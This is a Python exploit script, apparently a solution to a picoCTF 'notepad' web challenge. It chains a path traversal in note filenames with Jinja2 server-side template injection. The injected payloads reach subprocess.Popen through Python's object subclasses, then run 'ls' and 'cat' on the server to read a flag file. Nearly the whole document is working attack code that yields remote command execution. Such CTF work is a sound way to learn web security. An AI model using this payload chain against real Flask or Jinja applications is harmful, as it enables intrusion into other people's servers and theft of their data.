import requests
import re

# url = 'http://localhost:8000'
url = 'https://notepad.mars.picoctf.net'
url_start = "..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"


def insert_content(content, params):
    content = url_start + content
    res = requests.post(f'{url}/new', data={"content": content})
    filename = res.url[res.url.find('errors/') + len('errors/'):-5]

    params["error"] = filename

    new_url = f'{url}?error={filename}&class=__class__&mro=__mro__&subclasses=__subclasses__&fromobject=from_object'
    res = requests.get(url, params=params)
    return res


res = insert_content(
    # ''.__class__.__mro__[-1].__subclasses__
    "{{''[request.args.get('class')][request.args.get('mro')][-1][request.args.get('subclasses')]()}}",
    {
        "class": "__class__",
        "mro": "__mro__",
        "subclasses": "__subclasses__",
    }
)

def get_index_of(text, pat):
    parsed_text = text[text.find('['):text.find(']')]
    split_text = parsed_text.split(',')
    for i, s in enumerate(split_text):
        if pat in s:
            return i
    return -1

idx = get_index_of(res.text, 'Popen')

res = insert_content(
    # ''.__class__.__mro__[-1].__subclasses__[idx]('ls',stdout=-1)
    "{{''[request.args.get('class')][request.args.get('mro')][-1][request.args.get('subclasses')]()[%d]('ls',stdout=-1).communicate()}}" % idx,
    {
        "class": "__class__",
        "mro": "__mro__",
        "subclasses": "__subclasses__",
    }
)

flag_filename = re.search(r'flag.*txt', res.text).group()

res = insert_content(
    # ''.__class__.__mro__[-1].__subclasses__[idx]('cat $filename',stdout=-1)
    "{{''[request.args.get('class')][request.args.get('mro')][-1][request.args.get('subclasses')]()[%d](['cat', '%s'],stdout=-1).communicate()}}" % (idx, flag_filename),
    {
        "class": "__class__",
        "mro": "__mro__",
        "subclasses": "__subclasses__",
    }
)

print(res.text)

